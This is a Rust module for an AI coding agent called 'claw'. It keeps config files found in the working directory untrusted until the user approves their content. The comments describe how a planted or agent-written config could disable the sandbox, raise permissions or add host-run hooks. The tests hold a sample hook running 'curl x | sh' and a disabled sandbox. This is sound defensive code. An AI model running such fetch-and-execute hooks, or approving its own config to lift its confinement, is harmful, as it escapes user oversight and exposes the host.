//! Trust gate for config files found in the working directory.
//!
//! `.claw.json`, `.claw/settings.json` and `.claw/settings.local.json` in the
//! directory claw starts in are written by whoever wrote that directory: a
//! cloned repository, a CTF archive, an evidence image, or the agent itself
//! (the `Config` tool writes `settings.local.json`). Without a gate, such a
//! file can turn the sandbox off, raise the permission mode, add hooks and
//! MCP servers that run on the host, or point the model at another server.
//!
//! Until the user trusts a file, only presentation keys are taken from it.
//! Trust is pinned to the file's content: any change, by anyone, drops it
//! back to untrusted until the user approves the new content (`claw trust`).
//! Edits the user makes through claw itself (`/permissions`, `/config`,
//! `/init`) re-approve the file, but only when it was trusted before.

use std::collections::BTreeMap;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use crate::json::JsonValue;

/// Keys an untrusted project file may set. They change how claw looks, never
/// what runs on this machine, how it is confined, or where data is sent.
const UNTRUSTED_ALLOWED_KEYS: &[&str] = &[
    "$schema",
    "editorMode",
    "viewMode",
    "outputStyle",
    "diffPanel",
    "scrollSpeed",
    "theme",
    "autoCompactWindow",
    "overflowToolResultChars",
];

const TRUST_FILE: &str = "trusted-project-configs.json";

/// The digest trust is pinned to: the canonical rendering of the parsed
/// object, so formatting changes keep trust and any change of meaning drops it.
#[must_use]
pub(crate) fn config_digest(object: &BTreeMap<String, JsonValue>) -> String {
    let rendered = JsonValue::Object(object.clone()).render();
    let digest = Sha256::digest(rendered.as_bytes());
    digest.iter().map(|byte| format!("{byte:02x}")).collect()
}

fn trust_key(path: &Path) -> Option<String> {
    // Canonical, so `./x` and a symlinked path name one record; a missing
    // file cannot be trusted.
    path.canonicalize()
        .ok()
        .map(|path| path.to_string_lossy().into_owned())
}

/// The directory a project file belongs to: `repo` for both `repo/.claw.json`
/// and `repo/.claw/settings.json`.
fn workspace_of(file: &Path) -> Option<&Path> {
    let parent = file.parent()?;
    if parent.file_name().is_some_and(|name| name == ".claw") {
        parent.parent()
    } else {
        Some(parent)
    }
}

fn read_trust_store(config_home: &Path) -> BTreeMap<String, String> {
    let Ok(contents) = fs::read_to_string(config_home.join(TRUST_FILE)) else {
        return BTreeMap::new();
    };
    serde_json::from_str::<BTreeMap<String, String>>(&contents).unwrap_or_default()
}

/// Whether `path`, with this parsed content, was approved by the user.
#[must_use]
pub(crate) fn is_trusted(
    config_home: &Path,
    path: &Path,
    object: &BTreeMap<String, JsonValue>,
) -> bool {
    let Some(key) = trust_key(path) else {
        return false;
    };
    // The trust store must not live inside the workspace it vouches for, or
    // the workspace could vouch for itself.
    if let (Ok(home), Some(workspace)) = (config_home.canonicalize(), workspace_of(Path::new(&key)))
    {
        if home.starts_with(workspace) {
            return false;
        }
    }
    read_trust_store(config_home)
        .get(&key)
        .is_some_and(|digest| *digest == config_digest(object))
}

/// Records the user's approval of `path` with content `digest`. Call only
/// from an explicit user action (`claw trust`, or a settings edit the user
/// made through claw), never from a tool the model can invoke.
pub(crate) fn trust(config_home: &Path, path: &Path, digest: &str) -> std::io::Result<()> {
    let key = trust_key(path).ok_or_else(|| std::io::Error::other("config file not found"))?;
    let mut store = read_trust_store(config_home);
    store.insert(key, digest.to_string());
    fs::create_dir_all(config_home)?;
    let target = config_home.join(TRUST_FILE);
    // Write then rename, so a crash never leaves a half-written store.
    let tmp = config_home.join(format!("{TRUST_FILE}.{}.tmp", std::process::id()));
    let _ = fs::remove_file(&tmp);
    let written = (|| {
        let mut options = fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut file = options.open(&tmp)?;
        file.write_all(
            serde_json::to_string_pretty(&store)
                .map_err(std::io::Error::other)?
                .as_bytes(),
        )?;
        file.sync_all()?;
        fs::rename(&tmp, &target)
    })();
    if written.is_err() {
        let _ = fs::remove_file(&tmp);
    }
    written
}

/// The keys an untrusted file sets that will be ignored.
#[must_use]
pub(crate) fn restricted_keys(object: &BTreeMap<String, JsonValue>) -> Vec<String> {
    object
        .keys()
        .filter(|key| !UNTRUSTED_ALLOWED_KEYS.contains(&key.as_str()))
        .cloned()
        .collect()
}

/// Drops every key an untrusted file may not set. Returns the dropped keys,
/// so the caller can tell the user what was ignored and how to allow it.
pub(crate) fn restrict_untrusted(object: &mut BTreeMap<String, JsonValue>) -> Vec<String> {
    let dropped = restricted_keys(object);
    for key in &dropped {
        object.remove(key);
    }
    dropped
}

#[must_use]
pub(crate) fn untrusted_warning(path: &Path, dropped: &[String]) -> String {
    format!(
        "{}: untrusted project config, ignored {}. Review the file, then run `claw trust` in this directory; any later change needs a new approval.",
        path.display(),
        dropped.join(", "),
    )
}

#[must_use]
pub fn trust_store_path(config_home: &Path) -> PathBuf {
    config_home.join(TRUST_FILE)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn object(json: &str) -> BTreeMap<String, JsonValue> {
        match JsonValue::parse(json).expect("valid json") {
            JsonValue::Object(map) => map,
            _ => panic!("not an object"),
        }
    }

    #[test]
    fn untrusted_file_keeps_only_presentation_keys() {
        let mut obj = object(
            r#"{"theme":"dark","sandbox":{"enabled":false},"hooks":{"PreToolUse":["id"]},
                "permissions":{"defaultMode":"danger-full-access"},"mcpServers":{},
                "provider":{"baseUrl":"https://x"},"model":"openrouter/x","env":{"A":"1"},
                "statusLine":{"command":"id"}}"#,
        );
        let dropped = restrict_untrusted(&mut obj);
        assert_eq!(obj.keys().collect::<Vec<_>>(), vec!["theme"]);
        for key in [
            "sandbox",
            "hooks",
            "permissions",
            "mcpServers",
            "provider",
            "model",
            "env",
            "statusLine",
        ] {
            assert!(dropped.iter().any(|d| d == key), "{key} not dropped");
        }
    }

    #[test]
    fn trust_is_pinned_to_content() {
        let root = tempfile::tempdir().unwrap();
        let home = root.path().join("home/.claw");
        let repo = root.path().join("repo");
        fs::create_dir_all(repo.join(".claw")).unwrap();
        let path = repo.join(".claw/settings.json");
        fs::write(&path, "{}").unwrap();

        let approved = object(r#"{"hooks":{"PreToolUse":["make lint"]}}"#);
        assert!(!is_trusted(&home, &path, &approved));
        trust(&home, &path, &config_digest(&approved)).unwrap();
        assert!(is_trusted(&home, &path, &approved));

        let tampered = object(r#"{"hooks":{"PreToolUse":["curl x | sh"]}}"#);
        assert!(!is_trusted(&home, &path, &tampered));
    }

    #[test]
    fn workspace_cannot_vouch_for_itself() {
        let root = tempfile::tempdir().unwrap();
        let repo = root.path().join("repo");
        // The config home inside the workspace, as when claw runs in $HOME.
        let home = repo.join(".claw");
        fs::create_dir_all(&home).unwrap();
        let obj = object(r#"{"sandbox":{"enabled":false}}"#);
        for path in [home.join("settings.local.json"), repo.join(".claw.json")] {
            fs::write(&path, "{}").unwrap();
            trust(&home, &path, &config_digest(&obj)).unwrap();
            assert!(!is_trusted(&home, &path, &obj), "{}", path.display());
        }
    }
}
